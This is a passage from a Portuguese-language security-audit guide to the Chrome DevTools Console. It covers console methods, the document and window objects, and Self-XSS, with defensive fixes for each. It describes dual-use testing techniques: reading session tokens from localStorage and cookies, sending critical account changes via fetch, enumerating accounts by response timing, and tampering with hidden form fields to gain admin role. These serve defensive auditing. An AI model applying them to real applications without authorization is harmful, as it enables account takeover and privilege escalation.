9. **Como investigar o problema**: Verifique como a aplicação se comporta caso código arbitrário seja executado no Console da sessão autenticada: tente ler tokens em `localStorage`/`document.cookie` e tente disparar uma alteração de dados cadastrais críticos (como e-mail ou chave PIX) via `fetch()` sem informar a senha atual.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`**
    - Armazene cookies de sessão com `HttpOnly` para que um script colado no Console não consiga exfiltrar o identificador da sessão para um servidor externo (embora ainda possa fazer requisições locais enquanto a aba estiver aberta).
    - Exija **confirmação de senha atual ou desafio MFA (*step-up authentication*)** para operações críticas (alteração de credenciais, criação de chaves de API, transferências financeiras).
    - Configure a diretiva `connect-src` do **CSP** para impedir que um script colado no Console envie dados roubados via `fetch`/`XHR` para domínios de atacantes externos.
    - Em aplicações voltadas ao grande público, adicione um aviso educativo contra Self-XSS na inicialização do Console em produção:
      ```javascript
      console.log(
        "%cATENÇÃO: Área restrita a desenvolvedores!",
        "color: #d93025; font-size: 24px; font-weight: bold;"
      );
      console.log(
        "%cSe alguém pediu para você copiar e colar algo aqui para habilitar um recurso ou ganhar benefícios, trata-se de um golpe (Self-XSS) que dará acesso à sua conta.",
        "font-size: 14px;"
      );
      ```

---

<a id="s2-3-3"></a>
#### 2.3.3 JavaScript, métodos do objeto `console` e execução no REPL

O Console do Chrome DevTools não se limita a exibir mensagens passivas: ele expõe toda a **Console API** (interface de programação padronizada pelo WHATWG em `console.spec.whatwg.org`), dá acesso direto aos objetos globais da página (`window`, `document`, `localStorage`, `sessionStorage`, `fetch`, `Promise`, `async`/`await`) e fornece um conjunto exclusivo de funções utilitárias de linha de comando (**Console Utilities API**, como `$0`, `$_`, `$()`, `$$()`, `copy()` e `getEventListeners()`).

A seguir, cada método, objeto global e utilitário do REPL é analisado individualmente com sua ficha técnica completa, exemplos práticos e implicações de segurança.

##### `console.log()`

1. **Nome do parâmetro**: **`console.log(obj1 [, obj2, ..., objN])`** (Método de impressão geral no Console).
2. **O que significa**: É o método fundamental da Console API para imprimir mensagens de texto, valores primitivos, objetos, arrays e elementos do DOM no nível de severidade *Info*. Suporta múltiplos argumentos e especificadores de substituição estilo `printf` (`%s` para string, `%d` ou `%i` para inteiro, `%f` para ponto flutuante, `%o` para elemento DOM expansível, `%O` para objeto JavaScript expansível e `%c` para aplicar estilos CSS à saída).
3. **Para que serve**: Serve para inspecionar rapidamente valores em tempo de execução e formatar mensagens no painel do Console.
4. **Onde encontrar no DevTools**: Pode ser chamado dentro de qualquer script da aplicação ou digitado diretamente no prompt `>` da aba **Console**; sua saída aparece sob o filtro **Info**.
5. **Exemplo prático**:
   ```javascript
   // Múltiplos argumentos e especificadores de formatação:
   const usuario = { id: 42, login: "maria.silva", perfil: "auditora" };
   console.log("Usuária %s (ID: %d) carregada:", usuario.login, usuario.id, usuario);

   // Estilização com %c no Console:
   console.log("%c[STATUS] Sistema Operacional", "background: #1e8e3e; color: white; padding: 2px 6px; border-radius: 3px;");
   ```
   > [!NOTE]
   > **Armadilha de avaliação preguiçosa (*Lazy Evaluation*) de objetos**: Quando você faz `console.log(meuObjeto)` no Chrome e expande a seta `▶` alguns segundos depois, o DevTools lê as propriedades do objeto **no momento em que você clicou para expandir**, e não no momento em que o `console.log` foi executado (indicado por um pequeno ícone azul `[i]` ao passar o mouse: *"This value was evaluated upon first expansion"*). Para congelar o retrato exato do objeto no instante do log, use `console.log(structuredClone(meuObjeto))` ou `console.log(JSON.stringify(meuObjeto))`.
6. **Comportamento normal**: Imprime os argumentos separados por espaço na saída do Console e retorna `undefined`.
7. **O que seria considerado seguro**: **`[RECOMENDAÇÃO]`** Utilizar `console.log()` exclusivamente durante o desenvolvimento local e removê-lo automaticamente na etapa de empacotamento (*build*) de produção.
8. **O que poderia indicar uma vulnerabilidade**: Chamadas `console.log(res.data)`, `console.log(req.body)` ou `console.log(store.getState())` esquecidas em produção frequentemente despejam objetos completos contendo tokens JWT, dados bancários, CPFs, endereços, chaves de API de serviços externos e variáveis de sessão.
9. **Como investigar o problema**: Com a aba **Console** aberta e **Preserve log** ativado, filtre pela barra lateral em **User messages** e navegue por todas as telas da aplicação, expandindo todos os objetos registrados por chamadas `console.log`.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Configure o minificador de produção para remover chamadas `console.log` (ex.: `terserOptions: { compress: { drop_console: true } }`) e adote a regra `no-console` no ESLint.

##### `console.error()`

1. **Nome do parâmetro**: **`console.error(msg [, subst1, ..., substN])`** (Método de emissão de erro com *stack trace*).
2. **O que significa**: É o método da Console API que registra uma mensagem no fluxo de erro (`stderr` conceitual do navegador), atribuindo-lhe severidade **Error**, destaque visual vermelho, ícone `❌` e anexando automaticamente a **pilha de chamadas (*stack trace*)** do ponto onde foi invocado.
3. **Para que serve**: Serve para registrar falhas capturadas em blocos `try...catch` ou rejeições de Promises (`.catch()`), mantendo a rastreabilidade da pilha de execução sem interromper abruptamente o script.
4. **Onde encontrar no DevTools**: Na aba **Console**, destacado em vermelho e contabilizado no contador global de erros no topo direito do DevTools; filtrável em **Errors**.
5. **Exemplo prático**:
   ```javascript
   async function carregarFatura(faturaId) {
     try {
       const resp = await fetch(`/api/v1/faturas/${faturaId}`);
       if (!resp.ok) throw new Error(`Falha HTTP ${resp.status}`);
     } catch (erro) {
       console.error("Erro ao processar fatura:", erro);
     }
   }
   ```
6. **Comportamento normal**: Registra o erro em vermelho com uma seta `▶` expansível que mostra a cadeia de funções chamadas até `console.error()`.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Registrar apenas códigos de erro internos ou mensagens sanitizadas no cliente, enviando detalhes técnicos sensíveis apenas para um coletor seguro de telemetria autenticada quando estritamente necessário (e com mascaramento de dados pessoais).
8. **O que poderia indicar uma vulnerabilidade**: É extremamente comum encontrar em produção blocos `catch (err) { console.error(err.response); }` que imprimem no Console o objeto completo de erro retornado pelo servidor — incluindo *stack traces* de banco de dados (SQL, MongoDB), nomes de tabelas, caminhos internos (`/var/www/app/src/...`) e cabeçalhos de requisição com tokens de autorização.
9. **Como investigar o problema**: Provoque erros intencionais em entradas da aplicação (formulários com formatos inesperados, IDs inexistentes, perda simulada de rede) e inspecione os objetos passados para `console.error()` na categoria **Errors** do Console.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Nunca passe o objeto bruto de resposta de erro ou a configuração completa da requisição (como o objeto `error.config` do Axios, que contém o header `Authorization` e os dados enviados!) diretamente para `console.error()` em produção; registre apenas uma mensagem controlada (`console.error("Falha ao carregar recurso. Código:", erro.code)`).

##### `console.warn()`

1. **Nome do parâmetro**: **`console.warn(msg [, subst1, ..., substN])`** (Método de emissão de aviso).
2. **O que significa**: Registra uma mensagem com nível de severidade **Warning**, estilizada com fundo amarelo/âmbar, ícone `⚠️` e pilha de chamadas (*stack trace*) expansível.
3. **Para que serve**: Serve para sinalizar condições subótimas, uso de parâmetros obsoletos (*deprecated*), *fallbacks* de configuração ou alertas preventivos que merecem atenção, mas que não impedem a operação atual.
4. **Onde encontrar no DevTools**: Na aba **Console**, sob o nível de filtro **Warnings** e no contador de avisos da barra superior do DevTools.
5. **Exemplo prático**:
   ```javascript
   function configurarClienteAPI(opcoes) {
     if (opcoes.timeout > 30000) {
       console.warn("[Config] Timeout elevado configurado (%dms). Risco de lentidão na UI.", opcoes.timeout);
     }
   }
   ```
6. **Comportamento normal**: Exibe a linha com fundo amarelo e seta `▶` para expandir o *stack trace* de quem chamou a função.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Em bibliotecas e componentes internos, usar `console.warn()` apenas em modo de desenvolvimento para orientar outros desenvolvedores sobre o uso correto de propriedades e segurança.
8. **O que poderia indicar uma vulnerabilidade**: Mensagens `console.warn()` em produção revelando que um mecanismo de segurança falhou e entrou em modo permissivo de contingência (ex.: `⚠️ [Auth] Falha ao validar assinatura local do token; usando cache legado sem verificação` ou `⚠️ [Sanitizer] DOMPurify não carregado, renderizando HTML bruto como fallback`).
9. **Como investigar o problema**: Filtre o Console por **Warnings**, expanda o *stack trace* de cada aviso emitido por scripts da aplicação e verifique no código-fonte (aba *Sources*) que decisão lógica o código toma logo após emitir o `console.warn()`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Em controles de segurança (autenticação, autorização, validação e sanitização), adote sempre a postura **Fail-Secure / Fail-Closed** (falhar de modo seguro/fechado): se uma verificação de segurança falhar, interrompa a operação imediatamente em vez de apenas emitir um `console.warn()` e prosseguir de forma insegura.

##### `console.table()`

1. **Nome do parâmetro**: **`console.table(data [, columns])`** (Método de visualização tabular de dados estruturados).
2. **O que significa**: Recebe um **Array de objetos** ou um **Objeto de objetos** e renderiza seus dados como uma **tabela interativa e ordenável** diretamente dentro da aba Console, permitindo opcionalmente especificar no segundo parâmetro (`columns`) um array com os nomes das colunas que se deseja exibir.
3. **Para que serve**: Serve para visualizar e comparar rapidamente coleções de registros (listas de usuários retornadas por uma API, entradas de `localStorage`, cookies decodificados ou métricas de performance de recursos) sem precisar expandir dezenas de setas `▶` manualmente.
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Info**), tanto chamado por scripts quanto executado interativamente pelo auditor no REPL.
5. **Exemplo prático**:
   Durante uma auditoria no REPL do Console, você pode transformar o conteúdo do `localStorage` ou a lista de scripts carregados na página em uma tabela legível com uma única linha:
   ```javascript
   // Listar todos os scripts externos carregados na página e verificar se usam Subresource Integrity (SRI):
   console.table(
     Array.from(document.scripts).filter(s => s.src),
     ["src", "integrity", "crossOrigin", "async", "defer"]
   );
   ```
   O Console desenha uma grade com colunas `(index)`, `src`, `integrity`, `crossOrigin`, `async` e `defer`, permitindo clicar no cabeçalho de qualquer coluna para ordená-la!
6. **Comportamento normal**: Desenha a tabela interativa no Console e também imprime o array/objeto expansível logo abaixo da grade.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Como ferramenta do auditor no REPL, `console.table()` é extremamente útil e segura para auditar propriedades de elementos DOM (`document.forms`, `document.scripts`, `performance.getEntriesByType('resource')`). No código de produção da aplicação, não deve ser deixada ativa.
8. **O que poderia indicar uma vulnerabilidade**:
   - Quando deixada no código da aplicação (ex.: `console.table(listaClientes)`), expõe em formato tabular todos os campos retornados pela API — frequentemente revelando colunas ocultas que não aparecem na interface gráfica da página (**Excessive Data Exposure** — Exposição Excessiva de Dados, como `cpf`, `salario`, `hashSenha`, `isAdmin`).
   - Ao auditar `document.scripts` com `console.table()`, ver a coluna `integrity` vazia (`""`) para scripts carregados de CDNs (*Content Delivery Networks* — Redes de Distribuição de Conteúdo) de terceiros indica ausência de **SRI**, deixando a aplicação vulnerável caso a CDN seja comprometida.
9. **Como investigar o problema**: Ao interceptar uma variável global ou resposta de API no Console, execute `console.table(dados)` sem o segundo parâmetro para ver **todas** as colunas/propriedades presentes nos objetos retornados pelo back-end, comparando-as com o que realmente é exibido na tela.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Filtre os campos no servidor (usando DTOs — *Data Transfer Objects*, ou projeções de banco de dados) para que a API nunca envie propriedades sensíveis desnecessárias ao cliente, e remova chamadas `console.table()` do código de produção.

##### `console.dir()`

1. **Nome do parâmetro**: **`console.dir(object)`** (Listagem interativa de propriedades de objeto JavaScript).
2. **O que significa**: Exibe uma representação hierárquica interativa de todas as **propriedades do objeto JavaScript** especificado, em vez de tentar renderizá-lo como elemento HTML/XML.
3. **Para que serve**: A diferença crucial entre `console.log(elemento)` e `console.dir(elemento)` aparece ao inspecionar **nós do DOM**: enquanto `console.log(document.body)` imprime a árvore de marcação HTML (`<body><div>...</div></body>`), **`console.dir(document.body)`** imprime o **objeto JavaScript `HTMLBodyElement`** com todas as suas propriedades internas, métodos, eventos (`onclick`, `onerror`), `dataset`, `childNodes`, `style` e cadeia de protótipos (`[[Prototype]]`).
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Info**), ao executar `console.dir(...)` em um script ou no REPL.
5. **Exemplo prático**:
   ```javascript
   const inputSenha = document.querySelector('input[type="password"]');

   console.log(inputSenha);
   // Saída: <input type="password" id="senha" name="senha" class="form-control">

   console.dir(inputSenha);
   // Saída: ▶ input#senha.form-control (expande propriedades JS: autocomplete: "", defaultValue: "", disabled: false, form: form#login, value: "...", __reactProps$xyz: {...})
   ```
6. **Comportamento normal**: Exibe o objeto recolhido com uma seta `▶` que, ao ser clicada, lista em ordem alfabética todas as propriedades próprias e herdadas do objeto.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Não anexar dados secretos diretamente como propriedades customizadas de elementos do DOM nem manter estados sensíveis desprotegidos nas propriedades internas de componentes.
8. **O que poderia indicar uma vulnerabilidade**: Ao executar `console.dir(elemento)` em um componente de página moderna, frequentemente observam-se propriedades internas injetadas por frameworks (como `__reactFiber$...`, `__reactProps$...`, `__vueParentComponent` ou `__ngContext__`). Inspecionar essas propriedades via `console.dir()` pode revelar estados internos do componente que contêm dados não renderizados na tela, funções de *callback* administrativas ou flags de permissão puramente baseadas no cliente.
9. **Como investigar o problema**: Selecione um elemento de interesse na aba *Elements* (como um painel bloqueado ou formulário) para que ele seja referenciado por `$0`, vá até o **Console** e digite `console.dir($0)`. Expanda a árvore de propriedades e examine tanto os atributos nativos quanto propriedades iniciadas por `_` ou `__`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Nunca armazene dados confidenciais ou decisões de controle de acesso exclusivamente no estado (*state*/*props*) de componentes front-end que já foram enviados ao navegador de um usuário sem privilégio; dados restritos só devem ser transmitidos pelo servidor após validação de sessão e autorização no back-end.

##### `console.trace()`

1. **Nome do parâmetro**: **`console.trace([label])`** (Impressão de rastro da pilha de execução — *Stack Trace*).
2. **O que significa**: Imprime no Console a **pilha de chamadas (*call stack*)** exata desde o ponto onde `console.trace()` foi executado até a função raiz que iniciou a cadeia de execução (incluindo chamadas assíncronas rastreadas pelo V8).
3. **Para que serve**: Serve para descobrir **"quem chamou esta função?"** e por qual caminho lógico o código passou até chegar a um determinado ponto, sem precisar lançar um erro ou pausar a execução com um *breakpoint*.
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Info**), exibindo uma lista vertical de nomes de funções e links `arquivo.js:linha:coluna`.
5. **Exemplo prático**:
   ```javascript
   function enviarDadosCartao(payload) {
     console.trace("Rastreando origem do envio de dados de pagamento");
     // ...
   }
   function processarCheckout() { enviarDadosCartao({ final: "4242" }); }
   processarCheckout();
   ```
   Saída no Console:
   ```text
   ▼ console.trace: Rastreando origem do envio de dados de pagamento
       enviarDadosCartao   @ pagamento.js:2
       processarCheckout   @ pagamento.js:6
       (anonymous)         @ pagamento.js:7
   ```
6. **Comportamento normal**: Imprime o rótulo opcional seguido da árvore de chamadas em ordem reversa (da função mais interna no topo para a função iniciadora na base).
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Em auditorias no REPL, usar `console.trace()` dentro de *monkey-patching* (sobrescrita temporária de funções nativas no navegador do auditor) é uma técnica poderosa para descobrir qual script está lendo `document.cookie`, modificando `innerHTML` ou gravando em `localStorage`.
8. **O que poderia indicar uma vulnerabilidade**:
   - Se `console.trace()` for esquecido no código de produção, ele revela a arquitetura interna de funções e módulos da aplicação.
   - Em uma auditoria, se você interceptar `localStorage.setItem` com `console.trace()` e descobrir que o token de sessão está sendo lido por um script de analytics de terceiros na pilha de chamadas, você acabou de comprovar um vazamento de credenciais para terceiros!
9. **Como investigar o problema**: Para descobrir no REPL do Console **qual script está gravando no `localStorage`** ou **modificando o DOM**, execute este snippet de auditoria no Console:
   ```javascript
   // Auditoria no REPL: descobrir quem está escrevendo no localStorage
   const setItemOriginal = Storage.prototype.setItem;
   Storage.prototype.setItem = function(chave, valor) {
     console.trace(`[Auditoria Storage] Escrita detectada -> Chave: ${chave}`);
     return setItemOriginal.apply(this, arguments);
   };
   ```
   Agora interaja com a página: toda vez que qualquer script gravar no `localStorage`, o `console.trace()` mostrará exatamente qual arquivo e linha realizou a escrita!
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Remova chamadas `console.trace()` de depuração antes do *build* de produção e utilize mapas de código (*source maps*) restritos apenas à ferramenta interna de monitoramento de erros, sem expor arquivos `.js.map` publicamente em servidores de produção.

##### `console.group()`, `console.groupCollapsed()` e `console.groupEnd()`

1. **Nome do parâmetro**: **`console.group([label])`**, **`console.groupCollapsed([label])`** e **`console.groupEnd()`** (Agrupamento hierárquico de logs).
2. **O que significa**: São métodos que criam blocos visuais recuados (*indentados*) e recolhíveis na aba Console. Todas as mensagens emitidas após `console.group("Título")` (que nasce aberto) ou `console.groupCollapsed("Título")` (que nasce fechado/recolhido) ficam aninhadas dentro desse grupo até que `console.groupEnd()` seja chamado.
3. **Para que serve**: Serve para organizar logs relacionados a uma mesma transação, ciclo de mudança de estado (muito usado por *middlewares* como `redux-logger` ou `vuex`) ou etapa de diagnóstico, mantendo o Console estruturado em árvore.
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Info**), exibido como um cabeçalho em negrito com uma seta `▼` (aberto) ou `▶` (recolhido).
5. **Exemplo prático**:
   ```javascript
   console.groupCollapsed("[Auditoria Auth] Ciclo de Renovação de Sessão");
   console.log("1. Verificando expiração do token atual...");
   console.log("2. Solicitando novo par de tokens ao endpoint /auth/refresh");
   console.log("3. Sessão renovada com sucesso.");
   console.groupEnd();
   ```
6. **Comportamento normal**: `console.group()` exibe os itens filhos imediatamente visíveis; `console.groupCollapsed()` exige que o usuário clique na seta `▶` para revelar as linhas internas. Grupos podem ser aninhados uns dentro dos outros.
7. **O que seria considerado seguro**: **`[RECOMENDAÇÃO]`** Assim como `console.log()`, grupos de logs detalhando mudanças de estado da aplicação (*state management*) só devem estar ativos em ambiente de desenvolvimento.
8. **O que poderia indicar uma vulnerabilidade**: Bibliotecas de gerenciamento de estado (como `redux-logger`) frequentemente usam `console.groupCollapsed()` para registrar cada *action* disparada na aplicação (`prev state`, `action`, `next state`). Como os grupos nascem **recolhidos (`▶`)**, desenvolvedores muitas vezes não percebem o que está lá dentro e publicam o *logger* em produção. Ao clicar para expandir o grupo recolhido, o auditor encontra toda a árvore de estado da aplicação, incluindo dados pessoais do usuário logado, permissões e tokens!
9. **Como investigar o problema**: Ao ver qualquer linha com seta `▶` em negrito no Console (especialmente linhas geradas por *middlewares* de estado ou interceptadores HTTP como `▶ action LOGIN_SUCCESS @ 14:22:10`), **clique para expandir todos os níveis internos** (`prev state`, `action.payload`, `next state`) e inspecione os objetos aninhados.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Desabilite *middlewares* de log de estado (como `redux-logger`) em *builds* de produção (`const middlewares = process.env.NODE_ENV === 'development' ? [logger] : [];`).

##### `console.time()` e `console.timeEnd()`

1. **Nome do parâmetro**: **`console.time([label])`**, **`console.timeLog([label])`** e **`console.timeEnd([label])`** (Cronômetros de alta precisão do Console).
2. **O que significa**: `console.time("rotulo")` inicia um cronômetro interno identificado pelo nome `"rotulo"`; `console.timeLog("rotulo")` imprime o tempo decorrido até o momento sem parar o cronômetro; e `console.timeEnd("rotulo")` encerra o cronômetro e imprime no Console o tempo total decorrido em milissegundos (com precisão de frações de milissegundo via `performance.now()`).
3. **Para que serve**: Serve para medir o tempo de execução de algoritmos, renderizações de DOM, operações criptográficas no cliente ou latência de chamadas assíncronas.
4. **Onde encontrar no DevTools**: Na aba **Console** (em versões atuais do Chrome, a saída de `console.timeEnd()` é classificada sob o nível **Info** ou **Verbose** dependendo da versão — `**[Varia por versão]**`).
5. **Exemplo prático**:
   ```javascript
   console.time("DerivacaoPBKDF2");
   await window.crypto.subtle.deriveBits(parametrosPBKDF2, chaveBase, 256);
   console.timeEnd("DerivacaoPBKDF2");
   // Saída no Console: DerivacaoPBKDF2: 184.4208984375 ms
   ```
6. **Comportamento normal**: Imprime `<label>: <tempo> ms`. Se `console.time()` for chamado duas vezes com o mesmo rótulo sem `timeEnd()`, ou se `timeEnd()` for chamado para um rótulo inexistente, o Console emite um aviso amarelo (`⚠️ Timer '...' already exists` ou `Timer '...' does not exist`).
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Utilizar cronômetros durante testes de desempenho e auditoria para verificar se operações no cliente não causam travamento da interface ou se respostas de endpoints sensíveis possuem tempo constante.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Análise de ataques de temporização (*Timing Side-Channel Attacks*) e enumeração de usuários**: no REPL do Console, um auditor pode usar `console.time()` / `performance.now()` ao redor de requisições `fetch()` para medir se o endpoint de login ou recuperação de senha demora significativamente mais tempo quando um e-mail **existe** no banco de dados (ex.: 350ms porque executou o cálculo de hash Argon2/bcrypt) do que quando o e-mail **não existe** (ex.: 15ms porque retornou imediatamente), permitindo enumerar contas válidas pelo tempo de resposta!
   - **Detecção de ReDoS (*Regular Expression Denial of Service*)**: medir no Console se uma função de validação de entrada com expressão regular cresce exponencialmente em tempo (`timeEnd` saltando de `1ms` para `8000ms`) ao receber uma string maliciosamente construída.
9. **Como investigar o problema**: No REPL do Console, meça a diferença de tempo entre cenários de teste usando `console.time("teste")` e `console.timeEnd("teste")` (ou `performance.now()`) e compare a duração das operações na aba *Network* (*Timing*).
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** No back-end, mitigue diferenças de tempo em rotas de autenticação executando uma verificação de hash fictícia (*dummy hash comparison*) quando o usuário não for encontrado, e no front-end evite expressões regulares com quantificadores aninhados ambíguos (como `(a+)+$`) vulneráveis a *catastrophic backtracking*.

##### `console.count()` e `console.countReset()`

1. **Nome do parâmetro**: **`console.count([label])`** e **`console.countReset([label])`** (Contador de execuções).
2. **O que significa**: `console.count("rotulo")` mantém um contador interno associado ao `"rotulo"` fornecido (ou `"default"` se omitido) e imprime no Console quantas vezes aquela linha específica foi executada; `console.countReset("rotulo")` zera o contador correspondente.
3. **Para que serve**: Serve para verificar quantas vezes uma função, um *render* de componente, um interceptador de rede ou um *listener* de evento está sendo acionado durante o uso da aplicação.
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Info**).
5. **Exemplo prático**:
   ```javascript
   function validarTokenLocal() {
     console.count("VerificacaoDeToken");
     // ...
   }
   validarTokenLocal(); // VerificacaoDeToken: 1
   validarTokenLocal(); // VerificacaoDeToken: 2
   console.countReset("VerificacaoDeToken");
   validarTokenLocal(); // VerificacaoDeToken: 1
   ```
6. **Comportamento normal**: Incrementa em `1` e imprime `<label>: <contagem>` a cada chamada.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Usar durante o desenvolvimento e auditoria para garantir que eventos críticos (como submissão de pagamento, envio de código SMS/e-mail ou renovação de token) sejam disparados exatamente **uma única vez** por ação do usuário.
8. **O que poderia indicar uma vulnerabilidade**:
   - Se uma função que dispara uma transação ou renovação de token (`refresh_token`) for executada múltiplas vezes em paralelo por um único clique (falha de *debounce* ou falta de desabilitação do botão de envio), isso pode desencadear **Condições de Corrida (*Race Conditions*)** no servidor ou invalidar prematuramente uma família de *refresh tokens* com detecção de reúso.
   - Contadores subindo indefinidamente revelam vazamentos de *event listeners* (eventos registrados repetidamente sem `removeEventListener`), degradando a memória e a estabilidade da página.
9. **Como investigar o problema**: Ao auditar eventos no REPL ou depurar com *Logpoints* na aba *Sources*, utilize `console.count("evento")` para verificar se uma única interação na interface aciona múltiplos disparos redundantes.
10. **Como corrigir ou prevenir**: **`[BOA PRÁTICA]`** Implemente bloqueio de estado de submissão (`isSubmitting = true` desabilitando o botão até a resposta chegar), utilize chaves de idempotência (`Idempotency-Key`) em requisições `POST` financeiras/críticas e remova *listeners* no desmontar de componentes.

##### `console.clear()`

1. **Nome do parâmetro**: **`console.clear()`** (Limpeza programática do histórico do Console).
2. **O que significa**: É o método que apaga todas as mensagens visíveis atualmente na aba Console e exibe a nota informativa *`Console was cleared`* (ou *"O console foi limpo"*). No entanto, **se a opção `Preserve log` estiver ativada pelo usuário no DevTools, `console.clear()` é ignorado pelo Chrome**, mantendo o histórico intacto!
3. **Para que serve**: Serve para limpar a tela durante sessões interativas no REPL (onde também se pode usar o atalho `Ctrl + L` ou a função utilitária `clear()`) ou para reiniciar a visualização de logs em ambientes de desenvolvimento com *Hot Module Replacement* (HMR — substituição de módulos a quente).
4. **Onde encontrar no DevTools**: Executado por scripts ou pelo prompt do **Console**, ou clicando no botão **Clear console** (ícone de círculo cortado `🚫` no canto superior esquerdo da aba Console).
5. **Exemplo prático**:
   ```javascript
   // Em um script da página:
   console.log("Dado temporário:", segredo);
   console.clear(); // Tenta apagar a tela do Console
   ```
6. **Comportamento normal**: Quando **Preserve log** está desmarcado, apaga as linhas anteriores e imprime `Console was cleared` apontando para o arquivo e linha que chamou `console.clear()`. Quando **Preserve log** está marcado, não apaga absolutamente nada.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Jamais confiar em `console.clear()` como medida de segurança para "apagar rastros" de dados sensíveis que foram impressos anteriormente no Console, nem usar loops de `setInterval(() => console.clear(), 100)` como técnica de "anti-debugging".
8. **O que poderia indicar uma vulnerabilidade**:
   - **Tentativa de ocultação (*Security by Obscurity* ou comportamento malicioso)**: scripts maliciosos (como *skimmers* de cartão de crédito ou *keyloggers*) e códigos legados mal projetados frequentemente chamam `console.clear()` logo após uma falha de rede ou dentro de um `setInterval` para tentar impedir que a vítima ou o auditor veja erros de CORS/CSP ou mensagens comprometedoras no Console.
   - Ver a mensagem `Console was cleared` apontando para um script ofuscado ao abrir a página é um forte sinal de alerta (*red flag*) de script tentando dificultar a inspeção no DevTools.
9. **Como investigar o problema**: Se notar que o Console está sendo limpo sozinho ou exibir `Console was cleared`:
   1. Abra imediatamente **Console settings (`⚙`)** e marque **Preserve log**: isso neutraliza completamente chamadas a `console.clear()` feitas pela página!
   2. Clique no link `arquivo.js:linha` ao lado da mensagem `Console was cleared` para abrir na aba *Sources* o script exato que tentou limpar a tela.
   3. Opcionalmente, sobrescreva `console.clear = () => console.trace("Tentativa bloqueada de limpar o Console!")` para rastrear o chamador.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Nunca imprima dados sensíveis no Console achando que um `console.clear()` subsequente os protegerá, e remova técnicas de anti-depuração baseadas em limpeza periódica do Console.

##### `document`

1. **Nome do parâmetro**: **`document`** (Objeto global representante da árvore DOM da página).
2. **O que significa**: Representa o documento HTML carregado na janela ou frame atual (instância de `HTMLDocument` / `Document`, ponto de entrada do **DOM — *Document Object Model***). Através dele, o JavaScript pode ler, criar, alterar ou excluir qualquer elemento, atributo, formulário, link, script ou texto da página.
3. **Para que serve**: No REPL do Console, serve para consultar e manipular diretamente a estrutura da página (usando métodos como `document.querySelector()`, `document.querySelectorAll()`, `document.getElementById()`, `document.createElement()`) e inspecionar metadados do documento (`document.URL`, `document.domain`, `document.referrer`, `document.forms`, `document.scripts`, `document.cookie`).
4. **Onde encontrar no DevTools**: Digitando `document` diretamente no prompt `>` da aba **Console** (o `document` retornado será o do contexto selecionado no menu *Execution context*, como `top` ou um `<iframe>`).
5. **Exemplo prático**:
   ```javascript
   // 1. Inspecionar todos os campos ocultos (<input type="hidden">) de formulários da página:
   Array.from(document.querySelectorAll('input[type="hidden"]')).map(el => ({
     form: el.form?.id || el.form?.action,
     name: el.name,
     value: el.value
   }));

   // 2. Verificar de qual página o usuário veio (Referrer):
   document.referrer;
   ```
6. **Comportamento normal**: Retorna a referência viva para o documento HTML atual, permitindo leitura e modificação instantânea do DOM renderizado.
7. **O que seria considerado seguro**: **`[REQUISITO]`** O servidor **nunca** deve confiar cegamente em valores vindos do DOM do cliente (como campos `<input type="hidden" name="preco" value="100.00">`, atributos `disabled`, `readonly`, `maxlength` ou `type="number"`), pois qualquer usuário pode abrir o Console e alterar o `document` livremente antes de enviar o formulário.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Confiança em campos ocultos ou desabilitados**: usar `<input type="hidden" name="perfil" value="cliente">` ou `<input id="desconto" disabled value="0">` sem validar no servidor permite que o usuário execute `document.querySelector('[name="perfil"]').value = 'admin'` no Console e escale privilégios.
   - **Sumidouros (*Sinks*) perigosos no `document`**: o uso de `document.write()` ou `document.writeln()` com entradas não sanitizadas é uma das causas clássicas de **DOM-based XSS**.
9. **Como investigar o problema**: No REPL do Console, execute a busca por inputs ocultos e campos desabilitados mostrada no exemplo prático acima. Altere valores de campos ocultos (como IDs de usuário, preços ou roles), habilite botões desabilitados (`document.querySelector('#btn-aprovar').disabled = false`) e submeta o formulário em ambiente autorizado para verificar se o back-end rejeita a manipulação.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Trate toda entrada e estado provenientes do DOM como **não confiáveis**. Calcule preços, descontos e permissões exclusivamente no back-end com base na sessão autenticada no servidor, e substitua `document.write()` por métodos seguros de criação de nós (`document.createElement()` + `textContent`).

##### `window`

1. **Nome do parâmetro**: **`window`** (Objeto global da janela de navegação e raiz do BOM).
2. **O que significa**: É o objeto global de nível mais alto no navegador para um documento HTML, representando a janela ou aba (ou o quadro `<iframe>`) onde o script está rodando. Ele é a raiz do **BOM (*Browser Object Model* — Modelo de Objeto do Navegador)** e funciona como o escopo global (`globalThis`) do JavaScript no navegador: toda variável declarada com `var` fora de uma função ou atribuída sem declaração torna-se uma propriedade de `window`.
3. **Para que serve**: Serve para acessar APIs globais do navegador (`window.location`, `window.history`, `window.navigator`, `window.localStorage`, `window.fetch`, `window.crypto`, `window.crossOriginIsolated`, `window.opener`, `window.frames`) e inspecionar variáveis globais expostas pela aplicação.
4. **Onde encontrar no DevTools**: Digitando `window` (ou acessando diretamente suas propriedades) no prompt `>` da aba **Console**.
5. **Exemplo prático**:
   No REPL do Console, é possível listar apenas as variáveis globais customizadas que a própria aplicação adicionou ao objeto `window` (filtrando as propriedades nativas do navegador criando um iframe vazio temporário para comparação, ou buscando por prefixos comuns):
   ```javascript
